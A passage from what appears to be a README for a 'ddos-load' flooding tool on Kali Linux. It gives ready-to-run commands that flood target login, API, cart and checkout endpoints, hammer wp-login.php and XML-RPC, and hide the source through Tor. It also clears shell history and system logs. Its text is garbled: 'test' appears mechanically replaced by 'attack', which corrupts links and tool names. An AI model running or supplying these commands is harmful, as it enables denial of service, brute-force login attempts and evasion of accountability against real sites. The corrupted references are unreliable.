sudo nano /etc/security/limits.conf
# Add these lines:
# * soft nofile 10000
# * hard nofile 10000
```

#### 5. SSL Certificate Errors

```bash
# For self-signed certificates
python3 main-kali-linux.py https://target.com \
  -n 100 -c 10 \
  --no-verify-ssl

# Update CA certificates
sudo apt update
sudo apt install ca-certificates
sudo update-ca-certificates
```

#### 6. Memory Issues

```bash
# Check available memory
free -h

# Monitor memory during attack
watch -n 1 free -h

# Reduce concurrency if low on memory
python3 main-kali-linux.py http://target.com -n 5000 -c 25
```

#### 7. DNS Resolution Issues

```bash
# attack DNS resolution
nslookup target.com

# Use IP address directly
python3 main-kali-linux.py http://192.168.1.100 -n 100 -c 10

# Or add to /etc/hosts
echo "192.168.1.100 target.com" | sudo tee -a /etc/hosts
```

#### 8. Firewall/Proxy Issues

```bash
# Check if using proxy
echo $http_proxy
echo $https_proxy

# Temporarily disable proxy
unset http_proxy
unset https_proxy

# Check iptables rules
sudo iptables -L

# Temporarily flush iptables (careful!)
sudo iptables -F
```

### Performance Optimization on Kali

```bash
# Install performance dependencies
pip3 install aiodns cchardet Brotli

# Disable unnecessary services
sudo systemctl stop bluetooth
sudo systemctl stop cups

# Increase network buffers
sudo sysctl -w net.core.rmem_max=16777216
sudo sysctl -w net.core.wmem_max=16777216

# Optimize TCP settings
sudo sysctl -w net.ipv4.tcp_window_scaling=1
sudo sysctl -w net.ipv4.tcp_timestamps=1
```

### Debugging

```bash
# Run with Python debugging
python3 -v main-kali-linux.py http://target.com -n 10 -c 2

# Check for errors
python3 main-kali-linux.py http://target.com -n 10 -c 2 2>&1 | tee debug.log

# Verbose output
python3 -u main-kali-linux.py http://target.com -n 10 -c 2
```

---

## 📚 Kali Linux Resources

### Essential Kali Documentation

- [Kali Linux Official Docs](https://www.kali.org/docs/)
- [Kali Tools Documentation](https://www.kali.org/tools/)
- [Penetration attacking Execution Standard](http://www.penattack-standard.org/)
- [OWASP attacking Guide](https://owasp.org/www-project-web-ddos-attack-guide/)

### Recommended Wordlists

```bash
# Common wordlists in Kali
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/wordlists/rockyou.txt

# SecLists (install if not present)
sudo apt install seclists
ls /usr/share/seclists/
```

### Complementary Tools

```bash
# Network scanning
nmap -sV -p- target.com

# Web vulnerability scanning
nikto -h http://target.com
wapiti -u http://target.com

# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
dirb http://target.com

# SSL/TLS attacking
sslscan target.com
attackssl.sh target.com

# Web application firewall detection
wafw00f http://target.com
```

### Training Resources

- [Hack The Box](https://www.hackthebox.eu/)
- [TryHackMe](https://tryhackme.com/)
- [PenattackerLab](https://penattackerlab.com/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)

---

## 🎓 Usage Examples for Common Scenarios

### Scenario 1: Initial Assessment

```bash
# Step 1: Light reconnaissance
python3 main-kali-linux.py http://target.com -n 50 -c 5

# Step 2: If responsive, increase load
python3 main-kali-linux.py http://target.com -n 500 -c 25 --no-cache

# Step 3: attack specific endpoints found
python3 main-kali-linux.py http://target.com/admin -n 200 -c 10 --no-cache
```

### Scenario 2: API Security Assessment

```bash
# attack API authentication
python3 main-kali-linux.py http://target.com/api/v1/auth \
  -n 500 -c 25 -m POST \
  --body '{"username":"attack","password":"attack"}' \
  --no-cache

# attack API rate limiting
python3 main-kali-linux.py http://target.com/api/v1/data \
  -n 2000 -c 100 \
  -H "Authorization: Bearer token123" \
  --no-cache

# attack API without auth
python3 main-kali-linux.py http://target.com/api/v1/users \
  -n 1000 -c 50 --no-cache
```

### Scenario 3: E-commerce attacking

```bash
# attack product pages
python3 main-kali-linux.py http://target.com/products \
  -n 2000 -c 100 --no-cache --random-ua

# attack shopping cart
python3 main-kali-linux.py http://target.com/cart \
  -n 1000 -c 50 \
  -H "Cookie: session=attack123" \
  --no-cache

# attack checkout process
python3 main-kali-linux.py http://target.com/checkout \
  -n 500 -c 25 -m POST \
  -H "Cookie: session=attack123" \
  --body '{"payment":"card"}' \
  --no-cache
```

### Scenario 4: WordPress Security

```bash
# attack wp-login.php
python3 main-kali-linux.py http://target.com/wp-login.php \
  -n 500 -c 25 -m POST \
  --body "log=admin&pwd=attack" \
  --no-cache

# attack XML-RPC
python3 main-kali-linux.py http://target.com/xmlrpc.php \
  -n 500 -c 25 -m POST \
  -H "Content-Type: text/xml" \
  --no-cache

# attack REST API
python3 main-kali-linux.py http://target.com/wp-json/wp/v2/users \
  -n 1000 -c 50 --no-cache
```

### Scenario 5: Mobile API attacking

```bash
# Simulate mobile app traffic
python3 main-kali-linux.py http://target.com/api/mobile \
  -n 2000 -c 100 \
  -H "User-Agent: MyApp/1.0 (Android 11)" \
  -H "X-Device-ID: device123" \
  --no-cache

# attack with mobile user agent
python3 main-kali-linux.py http://target.com \
  -n 1000 -c 50 \
  -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)" \
  --no-cache
```

---

## 🛡️ Security Best Practices

### 1. Operational Security

```bash
# Use VPN when attacking
sudo openvpn client.ovpn

# Check your IP
curl ifconfig.me

# Use Tor for additional anonymity (if authorized)
proxychains python3 main-kali-linux.py http://target.com -n 100 -c 10
```

### 2. Evidence Collection

```bash
# Always log your activities
script -a penattack_$(date +%Y%m%d).log

# Take screenshots
scrot screenshot_$(date +%Y%m%d_%H%M%S).png

# Record terminal session
asciinema rec penattack_session.cast
```

### 3. Secure Communication

```bash
# Encrypt reports before sending
gpg -c report.txt

# Use secure file transfer
scp report.txt.gpg user@secure-server:/path/

# Secure email
# Use PGP/GPG encrypted email for sensitive findings
```

### 4. Clean Up

```bash
# Remove sensitive data after engagement
shred -vfz -n 10 sensitive_data.txt

# Clear bash history if needed
history -c
history -w

# Clear logs (only if authorized)
sudo journalctl --vacuum-time=1d
```

---

## 📞 Support and Community

### Getting Help

- **GitHub Issues**: [Report bugs or request features](https://github.com/rudraksha-avatara/ddos-load/issues)
- **Kali Forums**: [Kali Linux Forums](https://forums.kali.org/)
- **Security Community**: [Reddit r/netsec](https://reddit.com/r/netsec)

### Contributing

We welcome contributions from the security community:

1. Fork the repository
2. Create a feature branch
3. attack thoroughly on Kali Linux
4. Submit a pull request

### Reporting Security Issues

If you find security issues in the tool itself:
- **DO NOT** open a public issue
- Email: [security contact]
- Use PGP encryption if possible

---

## 📜 License

MIT License - See LICENSE file for details

---

## 🙏 Acknowledgments

**Developed by Team Supreme X**

Special thanks to:
- Kali Linux team for the amazing platform
- Python community for excellent libraries
- Security researchers who provide feedback
- All contributors to this project

---

## ⚠️ Final Warning

**This tool is for authorized DDoS Attack only.**

Unauthorized use is:
- ❌ Illegal
- ❌ Unethical
- ❌ Harmful
- ❌ Prosecutable

**Always get written authorization before attacking any system you don't own.**

---

<div align="center">

**Made with ❤️ by Team Supreme X**

**Use Responsibly | attack Ethically | Stay Legal**

[⬆ Back to Top](#-ddos-load-tool---kali-linux-edition)

</div>
